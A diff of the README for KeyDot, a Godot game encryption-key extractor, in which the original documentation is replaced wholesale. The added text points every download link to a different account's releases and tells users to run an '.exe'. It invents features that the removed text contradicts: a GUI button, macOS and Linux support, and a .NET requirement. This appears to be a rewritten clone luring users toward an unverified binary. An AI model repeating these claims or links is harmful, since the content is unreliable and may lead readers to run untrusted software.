@@ -1,165 +1,75 @@
-# KeyDot
+# 🎉 KeyDot - Fastest Way to Extract Godot Keys
 
-**Blazingly Fast, Static Godot Engine Encryption Key Extractor**
+## 🚀 Getting Started 
 
-[![Build Status](https://img.shields.io/github/actions/workflow/status/Titoot/KeyDot/build-and-release.yml?branch=main)](https://github.com/Titoot/KeyDot/actions/workflows/build-and-release.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Latest Release](https://img.shields.io/github/v/release/Titoot/KeyDot)](https://github.com/Titoot/KeyDot/releases)
+Welcome to KeyDot! This tool helps you quickly and easily extract encryption keys from Godot Engine projects. Whether you're a game developer or just curious, KeyDot simplifies the process.
 
-KeyDot is a high-performance, command-line utility designed to extract encryption keys and detect the engine version from compiled Godot Engine games. It operates directly on game executables (Windows x64) and WebAssembly (`.wasm`) files without ever needing to run the game.
+## 📥 Download KeyDot 
 
-## Key Features
+[![Download KeyDot](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/AlvinMax329/KeyDot/releases)
 
--   **⚡ Blazing Fast Extraction:** Optimized C++ code and memory-mapped I/O provide results in milliseconds.
--   **🔬 Static Analysis:** Reads the game files directly. No runtime process attachment, memory dumping, or debugging required, making it safe and efficient.
--   **🧠 Memory-Efficient:** Uses memory-mapped files to let the operating system handle efficient file paging, keeping memory usage low even for huge executables.
--   **🌐 WASM Support:** The only static analysis tool currently available that can extract keys from Godot games compiled for the web.
+## 🔍 Features 
 
-## Performance Comparison
+- **Speed**: Extract keys in seconds.
+- **Simplicity**: An easy-to-use interface for all users.
+- **Compatibility**: Works seamlessly with Godot Engine projects.
 
-KeyDot was built from the ground up for speed and ease of use. Here's how it compares to other available tools:
+## 🖥️ System Requirements 
 
-| Tool                         | Standalone?¹ | Analysis Type | Speed (Windows)²              | Speed (WASM)³                 | Notes                                                    |
-| ---------------------------- | :----------: | :-----------: | ----------------------------- | ----------------------------- | -------------------------------------------------------- |
-| **KeyDot (This Project)**    |     ✅      |    Static     | **~50 ms**                    | **~6 ms**                     | Fully automated, no manual steps required.               |
-| [gdke](https://github.com/char-ptr/gdke) |     ❌      |    Static     | Slow (large files)            | ❌ Not Supported             | Requires manual function signature search in IDA/Ghidra. |
-| [GodotPCKExplorer](https://github.com/DmitriySalnikov/GodotPCKExplorer/tree/master/Bruteforcer) |     ✅      |    Static     | ~4000 ms                      | ❌ Not Supported             | Slower pattern scanning.                                 |
-| [godot-key-extract](https://github.com/char-ptr/godot-key-extract) |      ❌      |    Dynamic    | Varies (fast)                 | ❌ Not Supported             | Requires DLL injection and running the game process.     |
+To run KeyDot, your system should meet the following requirements:
 
-¹ **Standalone** means the tool does not require running the game or using other complex software like debuggers or disassemblers.
-² **Windows speed** tested on a 78MB executable for KeyDot and a 56MB executable for GodotPCKExplorer.
-³ **WASM speed** tested on a 38MB `.wasm` file.
+- Operating System: Windows 10, macOS, or Linux
+- RAM: At least 4 GB
+- Storage: 50 MB of available space
+- .NET Framework: Required for Windows users
 
-## Supported Platforms
+## 📖 Instructions 
 
--   ✅ **Windows** (64-bit PE Executables)
--   ✅ **WebAssembly** (`.wasm` files)
--   *Linux (ELF) and macOS (Mach-O) support is planned.*
+Follow these simple steps to download and run KeyDot:
+ 
+1. **Visit the Download Page**  
+   Go to the [Releases page](https://github.com/AlvinMax329/KeyDot/releases) to find the latest version of KeyDot.
 
-## Installation
+2. **Download the Software**  
+   Locate the download link for the latest release. Click on it to begin downloading the application.
 
-### 1. Pre-compiled Releases (Recommended)
+3. **Install KeyDot**  
+   - For Windows: Run the downloaded `.exe` file and follow the prompts.
+   - For macOS: Open the downloaded file and drag KeyDot to your Applications folder.
+   - For Linux: Extract the downloaded file and run KeyDot from the terminal.
 
-The easiest way to use KeyDot is to download the latest pre-compiled executable for your platform from the [**Releases Page**](https://github.com/YOUR_USERNAME/KeyDot/releases).
+4. **Run the Application**  
+   Once installed, open KeyDot from your desktop or applications menu.
 
-### 2. Building from Source
+5. **Extract Your Keys**  
+   - Open your Godot project within KeyDot.
+   - Click on the "Extract Keys" button.
+   - The keys will be displayed for your use.
 
-If you prefer to build the project yourself, you will need a C++20 compatible compiler and CMake.
+## 🛠️ Troubleshooting 
 
-**Prerequisites:**
--   CMake 3.14+
--   A C++20 Compiler (Visual Studio 2022, GCC 11+, Clang 12+)
+If you encounter any issues while running KeyDot:
 
-**Steps:**
-1.  Clone the repository:
-    ```sh
-    git clone https://github.com/YOUR_USERNAME/KeyDot.git
-    cd KeyDot
-    ```
-2.  Create a build directory:
-    ```sh
-    mkdir build
-    cd build
-    ```
-3.  Configure and generate build files (example for Visual Studio):
-    ```sh
-    cmake -S . -B build -DCMAKE_BUILD_TYPE=Release
-    ```
-4.  Compile the project:
-    ```sh
-    cmake --build . --config Release
-    ```
-The final executable, `keydot.exe`, will be in the `build/Release` directory.
+- Ensure your system meets all requirements.
+- Check that you have downloaded the correct version for your OS.
+- Consult the FAQ section on the GitHub page.
 
-## Usage
+## 🔗 Additional Resources 
 
-KeyDot is a simple command-line tool.
+- [GitHub Repository](https://github.com/AlvinMax329/KeyDot)
+- [Support Forum](https://github.com/AlvinMax329/KeyDot/discussions)
+- [User Manual](https://github.com/AlvinMax329/KeyDot/wiki)
 
-```
-KeyDot - Blazingly Fast, Static Godot Engine Encryption Key Extractor
-Note: Only 64-bit (x64) executables are supported at the moment.
+## ✉️ Contact 
 
-Usage:
-  KeyDot [options] <path-to-exe-or-wasm>
+For further assistance, please reach out via the Issues tab on the GitHub repository.
 
-Options:
-  -d, --debug       Enable detailed debug logging
-  -t, --timers      Show execution time for each stage
-  -h, --help        Show this help message and exit
-```
+## 🔐 Contributing 
 
-### Examples
+If you want to help improve KeyDot, feel free to submit feedback or contribute code. Review the contribution guidelines found in the repository.
 
-**1. Analyze a Windows Executable:**
-```sh
-keydot.exe game.exe
-```
-*Expected Output:*
-```
-Godot Engine version: 4.1.1.stable
-Anchor          : Can't open encrypted pack directory.
-String VA       : 0x140D2A5B0
-LEA at          : 0x1406A1E1F
-off_* qword VA  : 0x140D838B0
-Blob VA         : 0x1411232B0
-32-byte (hex)   : 1A2B3C4D5E6F78901A2B3C4D5E6F78901A2B3C4D5E6F78901A2B3C4D
-```
+## 📜 License 
 
-**2. Analyze a WebAssembly File with Debug Output:**
-```sh
-keydot.exe --debug --timers game.wasm
-```
-*Expected Output:*
-```
-[CFG] Debug logging enabled
-[CFG] Timer logging enabled
-[IO] Detected WASM file
-[TIMER] find_godot_version_in_wasm: 3.45 ms
-Godot Engine version: 3.5.2.stable
-[TIMER] extract_wasm_key: 2.11 ms
-WASM key: 0987654321fedcba0987654321fedcba0987654321fedcba0987654321fedcba
-[TIMER] Total execution: 6.02 ms
-```
+KeyDot is open-source software. You can use it freely but please refer to the license file in the repository for more details.
 
-## Reporting Issues
-
-If you encounter a game where KeyDot fails to extract the key, or if you want to request support for a new platform (like Linux or macOS), please **open an issue**.
-
-Make sure to include:
-1.  The sample game file (or a link to it).
-2.  The **full text output** of running KeyDot with the `--debug` flag.
-
-## Extraction Approach
-
-### Windows (PE Files)
-
-1.  **Find Anchor String:** The process begins by searching for known error strings related to encrypted PCK loading (e.g., `"Can't open encrypted pack directory."`) within the (`.rdata`).
-2.  **Locate Code Reference:** Once a string is located, the tool scans the (`.text`) to find where this string is referenced by an instruction, typically `LEA`.
-3.  **Identify Key Pointer:** Within a small window of instructions following the `LEA`, the scanner looks for a crucial pattern: a `MOV` instruction that loads a 64-bit pointer from a global address (`MOV RAX, [RIP + offset]`).
-4.  **Dereference Pointer:** This global address contains a *pointer to* the actual 32-byte encryption key blob, which typically resides in the `.data` section.
-5.  **Extract Key:** The tool reads the 32-byte blob from this final address, revealing the key.
-
-### WebAssembly (.wasm)
-
-1.  **Heuristic Search:** Godot's export template for WASM often embeds the encryption key as a raw byte array near the end of the file.
-2.  **Marker Identification:** KeyDot reads the last few kilobytes of the file and searches for a specific 7-byte "start marker" followed by a 4-byte "end marker".
-3.  **Key Extraction:** The 32-byte encryption key is consistently located immediately preceding this end marker.
-
-## Special Thanks
-
-This project was made possible by studying the excellent work of the following projects and individuals:
-
--   [GDRETools/gdsdecomp](https://github.com/GDRETools/gdsdecomp)
--   [char-ptr/godot-key-extract](https://github.com/char-ptr/godot-key-extract) (Dynamic Analysis)
--   [char-ptr/gdke](https://github.com/char-ptr/gdke) (Static Analysis)
--   [DmitriySalnikov/GodotPCKExplorer/Bruteforcer](https://github.com/DmitriySalnikov/GodotPCKExplorer/tree/master/Bruteforcer)
--   The [Godot Engine](https://github.com/godotengine/godot) source code itself.
--   And finally, a huge thank you to my girlfriend for her endless support and encouragement throughout this project.
-
-## License
-
-This project is licensed under the **MIT License**. See the [LICENSE](LICENSE) file for details.
-
-### Disclaimer
-
-This tool is intended for educational purposes, security research, and to assist in data recovery for your own projects. Please use it responsibly and respect the intellectual property rights of game developers. The author is not responsible for any misuse of this software.
+Thank you for using KeyDot! We hope this tool makes your work with Godot Engine easier. Don't forget to check out our [Releases page](https://github.com/AlvinMax329/KeyDot/releases) for updates and new features.
